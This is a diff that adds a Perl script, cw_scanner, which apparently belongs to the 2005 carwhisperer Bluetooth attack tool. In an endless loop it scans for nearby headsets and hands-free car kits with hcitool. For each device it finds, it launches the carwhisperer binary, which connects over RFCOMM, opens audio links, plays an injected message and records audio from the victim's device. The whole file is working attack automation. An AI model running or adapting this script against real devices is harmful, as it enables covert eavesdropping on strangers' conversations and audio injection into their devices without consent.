@@ -1,0 +1,31 @@
+#!/usr/bin/perl
+
+# cw_scanner
+#
+# in July 2005 by Martin Herfurt (martin@trifinite.org)
+# 
+# The cw_scanner script is repeatedly performing a device inquiry for visible 
+# Bluetooth devices of which the class matches the one of Bluetooth Headsets 
+# and Hands-Free Units. Once a visible Bluetooth device with the appropriate 
+# device class is found, the cw_scanner script executes the carwhisperer binary 
+# that connects to the found device (on RFCOMM channel 1) and opens a control 
+# connection and connects the SCO links.
+
+undef @device_history;
+mkdir("results", 0755) || die "Cannot mkdir results: $!";
+while (1) {
+	$i++;
+	open HCITOOL , "hcitool -i hci0 inq --flush | grep 0x200 |";
+	@devices=<HCITOOL>;
+	close HCITOOL;
+	chop $device;
+	($bdaddr,$co,$class)=split ' ', @devices[0];
+	print $bdaddr."\n";
+	if (length($bdaddr)>10) {
+	
+		system("echo -e \"$bdaddr\\n\" > results/$i.log");	
+		system("play /home/martin/message.wav &");	
+		system("./carwhisperer 0 message.raw results/$i.raw $bdaddr 1 >> $i.log");
+		undef $bdaddr;
+	}
+}
